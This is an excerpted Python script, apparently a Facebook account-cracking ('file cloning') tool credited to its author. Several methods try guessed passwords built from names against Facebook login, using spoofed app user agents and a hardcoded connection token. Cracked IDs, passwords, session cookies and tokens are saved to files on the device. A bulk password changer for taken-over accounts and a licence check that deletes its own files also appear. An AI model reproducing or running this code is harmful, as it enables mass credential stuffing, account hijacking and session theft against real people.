...
while attemps < 12345677901:
      ...
      if username == 'Sex' and password == 'Boy':
...
os.system('xdg-open https://www.facebook.com/profile.php?id=100055859781950&mibextid=9R9pXO')
...
\033[31;1m ____  _     _      ____  _     
\033[31;1m/ ___\/ \ /\/ \__/|/  _ \/ \  /|
\033[31;1m|    \| | ||| |\/||| / \|| |\ ||
\033[31;1m\___ || \_/|| |  ||| \_/|| | \||
\033[31;1m\____/\____/\_/  \|\____/\_/  \|
                               
\x1b[38;5;46m__________________________________________________
 \033[1;31m[\033[1;32m[H]\033[1;31m]\033[1;32m DEVELOPER : SUMOM HASAN
 \033[1;31m[\033[1;32m[R]\033[1;31m]\033[1;32m DEVELOPER : SUMON HASAN
 \033[1;31m[\033[1;32m[I]\033[1;31m]\033[1;32m FACEBOOK  : SUMOM HASAN
 \033[1;31m[\033[1;32m[D]\033[1;31m]\033[1;32m GITHUB    : SUMOM HASAN
 \033[1;31m[\033[1;32m[O]\033[1;31m]\033[1;32m TOOLS     : FILE CLONIG
 \033[1;31m[\033[1;32m[Y]\033[1;31m]\033[1;32m VERSION   : \033[1;31m[V2.01]
 \x1b[38;5;46m__________________________________________________
...
def iAmApprovelSystem():
	...
	if 'free' in str(server_keys):
		...
		if str(bumper)+'|fuck' in server_keys:
			...
			os.system("rm -rf d64 d32 SUMOM HASAN")
			exit()
...
def iAmMethod3Ua():
	...
	ua = random.choice("Mozilla/5.0 (Linux; Android 10; SM-G960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]")
	return ua
...
class iAmMain:
	...
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SUMOM HASAN] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[SUMOM HASAN-OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/SUMOM HASAN_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SUMOM HASAN_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SUMOM HASAN-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SUMOM HASAN_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SUMOM HASAN] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': connection_token()}
				...
				if "session_key" in q:
					...
					ok.append(uid)
					open('/sdcard/SUMOM HASAN_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SUMOM HASAN_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SUMOM HASAN-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SUMOM HASAN_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SUMOM HASAN %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[SUMOM HASAN-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/SUMOM HASAN_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SUMOM HASAN_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SUMOM HASAN-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SUMOM HASAN_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method4(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SUMOM HASAN] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
			...
			for ps in pwx:
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[SUMOM HASAN-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/SUMOM HASAN_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SUMOM HASAN_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SUMOM HASAN-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SUMOM HASAN_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def r_crack(self,uid,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SUMOM HASAN] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			for pw in pwx:
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[SUMOM HASAN-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/SUMOM HASAN_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SUMOM HASAN_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SUMOM HASAN-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SUMOM HASAN_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
class automation:
	...
	def iAmPasswordManager(self):
		logo()
		p(" [•] Password Changer By : SUMOM HASAN")
		line()
	...
	def bulk_password(self):
		...
		try:
			...
			iamdefaultpassword = "SUMOM HASAN@@@"
		logo()
		p(" [•] Password Changer By : SUMOM HASAN")
		line()
	...
	def change_default(self):
		...
		try:
			...
			iamdefaultpassword = "SUMOM HASAN786"
...
if __name__=="__main__":
	#update()
	iAmMain().iAmMenu()
	#iAmMain().method4('100089112641726','vishnu singh',['Hasan Sumon'])